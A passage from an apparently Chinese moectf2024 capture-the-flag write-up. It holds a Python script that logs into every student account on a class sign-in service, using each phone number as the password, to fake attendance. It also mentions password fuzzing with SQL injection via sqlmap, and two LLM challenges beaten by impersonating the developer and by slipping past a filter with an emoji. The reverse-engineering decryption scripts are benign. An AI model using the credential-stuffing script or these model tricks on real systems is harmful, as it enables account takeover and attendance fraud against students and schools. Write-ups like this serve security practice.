</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> teacher_phone
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>QR_code_params <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: <span style=color:#e6db74>&#34;xxx&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;c&#34;</span>: <span style=color:#e6db74>&#34;xxx&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;enc&#34;</span>: <span style=color:#e6db74>&#34;xxx&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;DB_STRATEGY&#34;</span>: <span style=color:#e6db74>&#34;PRIMARY_KEY&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;STRATEGY_PARA&#34;</span>: <span style=color:#e6db74>&#34;id&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 持续化 session</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>teacher_login</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/fanyalogin&#34;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;uname&#34;</span>: teacher_phone,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;password&#34;</span>: password
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        response_data <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>json()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> response_data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;status&#39;</span>):
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Teacher logged in successfully.&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Teacher login failed.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error during teacher login: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_student_account</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/widget/sign/pcTeaSignController/showSignInfo1&#34;</span>)
</span></span><span style=display:flex><span>        students <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>json()<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;data&#34;</span>, {})<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;changeUnSignList&#34;</span>, [])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> [student[<span style=color:#e6db74>&#34;uid&#34;</span>] <span style=color:#66d9ef>for</span> student <span style=color:#f92672>in</span> students]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error fetching student account: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>student_login</span>(phone):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/fanyalogin&#34;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;uname&#34;</span>: str(phone),
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;password&#34;</span>: str(phone)
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response<span style=color:#f92672>.</span>json()<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;status&#39;</span>, <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error during student login for </span><span style=color:#e6db74>{</span>phone<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>scan_QR</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/widget/sign/e&#34;</span>, params<span style=color:#f92672>=</span>QR_code_params)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error scanning QR code: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    teacher_login()
</span></span><span style=display:flex><span>    student_phones <span style=color:#f92672>=</span> get_student_account()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> student_phones:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;No students to process.&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    successful_sign_ins <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> index, phone <span style=color:#f92672>in</span> enumerate(student_phones, start<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Processing student </span><span style=color:#e6db74>{</span>phone<span style=color:#e6db74>}</span><span style=color:#e6db74> (#</span><span style=color:#e6db74>{</span>index<span style=color:#e6db74>}</span><span style=color:#e6db74>)...&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> student_login(phone):
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Student </span><span style=color:#e6db74>{</span>phone<span style=color:#e6db74>}</span><span style=color:#e6db74> logged in successfully.&#34;</span>)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> scan_QR()
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Scan result for student </span><span style=color:#e6db74>{</span>phone<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>result<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;签到成功&#34;</span> <span style=color:#f92672>in</span> result:
</span></span><span style=display:flex><span>                successful_sign_ins <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># Clear session cookies to prevent carry-over issues</span>
</span></span><span style=display:flex><span>            session<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>clear()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Student </span><span style=color:#e6db74>{</span>phone<span style=color:#e6db74>}</span><span style=color:#e6db74> login failed.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;All students processed. Total successful sign-ins: </span><span style=color:#e6db74>{</span>successful_sign_ins<span style=color:#e6db74>}</span><span style=color:#e6db74>.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> successful_sign_ins <span style=color:#f92672>==</span> len(student_phones):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;All students have signed in successfully.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>len(student_phones) <span style=color:#f92672>-</span> successful_sign_ins<span style=color:#e6db74>}</span><span style=color:#e6db74> students failed to sign in.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h2 id=smbms复现>smbms(复现)</h2><p>这题没看，做起来其实主要就是sql这边的注入慢慢的调试吧默认是admin然后bp来fuzz一下密码，得到1234567</p><p>然后就是慢慢调试sqlmap了，最后的命令如图</p><p><img alt=sms loading=lazy src=/posts/ctf/moectf2024/sms.png></p><h1 id=开发与运维基础>开发与运维基础</h1><h2 id=运维入门指北>运维入门指北</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find . -name <span style=color:#e6db74>&#34;*.bak&#34;</span> -type f -exec rm -f <span style=color:#f92672>{}</span> +
</span></span><span style=display:flex><span>find . -name <span style=color:#e6db74>&#34;*.xml&#34;</span> -type f -exec sh -c <span style=color:#e6db74>&#39;for file; do mv -- &#34;$file&#34; &#34;${file%.xml}.html&#34;; done&#39;</span> _ <span style=color:#f92672>{}</span> +
</span></span><span style=display:flex><span>find . -type f | <span style=color:#66d9ef>while</span> read -r file; <span style=color:#66d9ef>do</span> filename<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>basename <span style=color:#e6db74>&#34;</span>$file<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span>; dir1<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>filename:0:2<span style=color:#e6db74>}</span>; dir2<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>filename:2:2<span style=color:#e6db74>}</span>; mkdir -p <span style=color:#e6db74>&#34;</span>$dir1<span style=color:#e6db74>/</span>$dir2<span style=color:#e6db74>&#34;</span>; mv <span style=color:#e6db74>&#34;</span>$file<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span>$dir1<span style=color:#e6db74>/</span>$dir2<span style=color:#e6db74>/</span>$filename<span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>su toor
</span></span><span style=display:flex><span>mv * /var/www/html/
</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#39;flag&#39;</span> /var/log/nginx/access.log
</span></span></code></pre></div><h2 id=哦不我的libc>哦不！我的libc！</h2><p>用xshell进行连接，简单测试一下常规的语句都不能用了</p><p>使用Shell 内建命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#66d9ef>while</span> IFS<span style=color:#f92672>=</span> read -r line; <span style=color:#66d9ef>do</span> echo <span style=color:#e6db74>&#34;</span>$line<span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>done</span> &lt; /flag.txt
</span></span></code></pre></div><p>得到flag</p><h1 id=大语言模型应用安全>大语言模型应用安全</h1><h2 id=neuro>Neuro?</h2><p>先我是vedal回答，然后告诉他亲自好像（二次认证好像,不太记得了</p><h2 id=并非助手>并非助手</h2><p>尝试了一会正常的是不能输入的，表情包可以，联想到flag就是旗子，输入🚩得到flag</p><h1 id=逆向工程>逆向工程</h1><h2 id=逆向工程入门指北>逆向工程入门指北</h2><p>代码放在c环境里面运行就行</p><h2 id=xor>xor</h2><p>进行简单的异或就行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>ls<span style=color:#f92672>=</span>[<span style=color:#ae81ff>0x49</span>, <span style=color:#ae81ff>0x4B</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x47</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x5F</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x1C</span>, <span style=color:#ae81ff>0x16</span>, <span style=color:#ae81ff>0x46</span>,<span style=color:#ae81ff>0x10</span>, <span style=color:#ae81ff>0x13</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x1C</span>, <span style=color:#ae81ff>0x40</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x16</span>, <span style=color:#ae81ff>0x46</span>, <span style=color:#ae81ff>0x1C</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x10</span>,<span style=color:#ae81ff>0x10</span>,<span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x1D</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x46</span>, <span style=color:#ae81ff>0x15</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x14</span>,<span style=color:#ae81ff>0x14</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x17</span>, <span style=color:#ae81ff>0x16</span>, <span style=color:#ae81ff>0x14</span>,<span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x40</span>,<span style=color:#ae81ff>0x40</span>, <span style=color:#ae81ff>0x16</span>, <span style=color:#ae81ff>0x14</span>, <span style=color:#ae81ff>0x47</span>, <span style=color:#ae81ff>0x12</span>, <span style=color:#ae81ff>0x40</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x14</span>, <span style=color:#ae81ff>0x59</span>]
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#960050;background-color:#1e0010>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i in ls:
</span></span><span style=display:flex><span>s<span style=color:#f92672>+=</span><span style=color:#a6e22e>chr</span>(i<span style=color:#f92672>^</span><span style=color:#ae81ff>0x24</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(s)
</span></span></code></pre></div><h2 id=tea>TEA</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>decrypt</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>&amp;</span>v4, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>&amp;</span>v5) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> delta <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x9E3779B9</span>;  <span style=color:#75715e>// 固定值 1640531527
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v3 <span style=color:#f92672>=</span> delta <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span>;     <span style=color:#75715e>// 反向过程从最大值开始
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> v6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (v6 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        v5 <span style=color:#f92672>-=</span> ((v4 <span style=color:#f92672>+</span> v3) <span style=color:#f92672>^</span> ((v4 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1634038898</span>)) <span style=color:#f92672>^</span> ((v4 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1634038904</span>);
</span></span><span style=display:flex><span>        v4 <span style=color:#f92672>-=</span> ((v5 <span style=color:#f92672>+</span> v3) <span style=color:#f92672>^</span> ((v5 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1702060386</span>)) <span style=color:#f92672>^</span> ((v5 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1870148662</span>);
</span></span><span style=display:flex><span>        v3 <span style=color:#f92672>-=</span> delta;  <span style=color:#75715e>// 解密时减少 delta
</span></span></span><span style=display:flex><span>        v6<span style=color:#f92672>--</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>676078132</span>;  <span style=color:#75715e>// xxxxxxxx 部分解密后的值
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>957400408</span>;  <span style=color:#75715e>// zzzz 和 yyyy 部分解密后的值
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 调用解密函数
</span></span></span><span style=display:flex><span>    decrypt(v4, v5);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 提取出 yyyy 和 zzzz 部分
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v11 <span style=color:#f92672>=</span> (v5 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFF</span>;  <span style=color:#75715e>// yyyy 部分
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> v9 <span style=color:#f92672>=</span> v5 <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFF</span>;           <span style=color:#75715e>// zzzz 部分
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 输出结果
</span></span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;xxxxxxxx = &#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>hex <span style=color:#f92672>&lt;&lt;</span> v4 <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;yyyy = &#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>hex <span style=color:#f92672>&lt;&lt;</span> v11 <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;zzzz = &#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>hex <span style=color:#f92672>&lt;&lt;</span> v9 <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;moectf{&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>hex <span style=color:#f92672>&lt;&lt;</span> v4 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>&lt;&lt;</span> v11 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>&lt;&lt;</span> v9 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;-9c42-caf30620caaf}&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=upx>upx</h2><p>先使用upx工具先脱壳，再进行ida的正常阅读</p><p>里面直接由flag</p><p><strong>moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}</strong></p><h2 id=upx-revenge>upx-revenge</h2><p>ESP x64dbg手动脱壳一下用ida64打开得到flag</p><p><img alt=upx-renvenge loading=lazy src=/posts/ctf/moectf2024/upx-renvenge.png></p><h2 id=dynamic>dynamic</h2><p>下载打开文件，按shift+f12找到对应的页面，找到what happened to my flag?</p><p>里面有一段逻辑进行REencrypto之后就变了，给what那行打断点，f9动调得到flag</p><p><img alt=dynamic loading=lazy src=/posts/ctf/moectf2024/dynamic.png></p><h2 id=d0tn3t>d0tN3t</h2><p>用dnSpy打开定位到关键代码，然后写解密脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;vector&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>vector<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>uint8_t</span><span style=color:#f92672>&gt;</span> array <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>173</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>161</span>, <span style=color:#ae81ff>174</span>, <span style=color:#ae81ff>132</span>, <span style=color:#ae81ff>179</span>, <span style=color:#ae81ff>187</span>, <span style=color:#ae81ff>234</span>, <span style=color:#ae81ff>231</span>, <span style=color:#ae81ff>244</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>177</span>, <span style=color:#ae81ff>161</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>166</span>, <span style=color:#ae81ff>247</span>, <span style=color:#ae81ff>229</span>, <span style=color:#ae81ff>207</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>180</span>, <span style=color:#ae81ff>230</span>, <span style=color:#ae81ff>156</span>, <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>182</span>, <span style=color:#ae81ff>236</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>105</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>215</span>, <span style=color:#ae81ff>148</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>199</span>, <span style=color:#ae81ff>137</span>, <span style=color:#ae81ff>124</span>, <span style=color:#ae81ff>38</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>228</span>, <span style=color:#ae81ff>55</span>, <span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>164</span>
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>string flag;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> array.size(); <span style=color:#f92672>++</span>i) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> decrypted_char <span style=color:#f92672>=</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span><span style=color:#f92672>&gt;</span>((array[i] <span style=color:#f92672>^</span> (i <span style=color:#f92672>*</span> i)) <span style=color:#f92672>^</span> <span style=color:#ae81ff>114</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>114</span>;
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>+=</span> decrypted_char;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Decrypted Flag: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> flag <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=逆向工程进阶指北>逆向工程进阶指北</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;cstring&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> <span style=color:#66d9ef>namespace</span> std;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>find</span>(<span style=color:#66d9ef>int</span> i, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>*</span> arr) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>; j <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>126</span>; j<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>; k <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>126</span>; k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> l <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>; l <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>126</span>; l<span style=color:#f92672>++</span>)
